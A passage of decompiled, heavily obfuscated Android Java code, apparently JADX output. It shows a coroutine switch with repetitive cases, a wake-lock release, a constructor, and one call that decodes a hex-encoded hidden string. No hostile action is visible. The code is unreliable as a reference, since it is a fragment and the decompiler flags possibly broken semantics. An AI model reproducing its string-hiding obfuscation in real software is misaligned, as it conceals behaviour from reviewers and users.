                                    String str12 = SyncQYAdapter.ECwLkmPW1UKz7J6E;
                                    y6jRGLEWNMir.l1V0lQr6TbwNKqHfXNbb(updateXPBridge.getApplicationContext());
                                    int i15 = UpdateXPBridge.w9sT1Swbhx3hs;
                                    TypefaceCache.obtain("00050059006900A400D5008000E5008600080053001B008400FF00B200C200AB00260062005E008300B000AC00C700A4002000730048009400F600AA00DE00AB003A");
                                    if (r3.isHeld()) {
                                        return eo0e0FTdv96U7KeCzoB;
                                    }
                                    r3.release();
                                    return eo0e0FTdv96U7KeCzoB;
                                case 6:
                                    SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                                    Object obj6 = ((roAK4OF9CtSmlCJgpQ) obj).w9sT1Swbhx3hs;
                                    return eo0e0FTdv96U7KeCzoB;
                                case 7:
                                    SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                                    Object obj7 = ((roAK4OF9CtSmlCJgpQ) obj).w9sT1Swbhx3hs;
                                    return eo0e0FTdv96U7KeCzoB;
                                case 8:
                                    SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                                    Object obj8 = ((roAK4OF9CtSmlCJgpQ) obj).w9sT1Swbhx3hs;
                                    return eo0e0FTdv96U7KeCzoB;
                                case 9:
                                    SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                                    Object obj9 = ((roAK4OF9CtSmlCJgpQ) obj).w9sT1Swbhx3hs;
                                    return eo0e0FTdv96U7KeCzoB;
                                case 10:
                                    SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                                    Object obj10 = ((roAK4OF9CtSmlCJgpQ) obj).w9sT1Swbhx3hs;
                                    return eo0e0FTdv96U7KeCzoB;
                                case 11:
                                    SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                                    Object obj11 = ((roAK4OF9CtSmlCJgpQ) obj).w9sT1Swbhx3hs;
                                    return eo0e0FTdv96U7KeCzoB;
                                case 12:
                                    SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                                    Object obj12 = ((roAK4OF9CtSmlCJgpQ) obj).w9sT1Swbhx3hs;
                                    return eo0e0FTdv96U7KeCzoB;
                                case 13:
                                    SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                                    Object obj13 = ((roAK4OF9CtSmlCJgpQ) obj).w9sT1Swbhx3hs;
                                    return eo0e0FTdv96U7KeCzoB;
                                default:
                                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                            }
                        } catch (Throwable th3) {
                            th = th3;
                        }
                    } catch (Exception e5) {
                        e = e5;
                        r1 = str4;
                    }
                } catch (Exception e6) {
                    e = e6;
                    r1 = r3;
                }
                break;
        }
    }

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public z1jyE6u5MXAb3Rr(String str, UpdateXPBridge updateXPBridge, String str2, Map map, JSONObject jSONObject, b9xRoaXFR1fmOO2Q b9xroaxfr1fmoo2q) {
        super(2, b9xroaxfr1fmoo2q);
        this.b1EoSIRjJHO5 = str;
        this.hjneShqpF9Tis4 = updateXPBridge;
        this.pyu8ovAipBTLYAiKab = str2;
        this.gmNWMfvn6zlEj = map;
        this.gIIiyi2ddlMDR0 = jSONObject;
    }
}
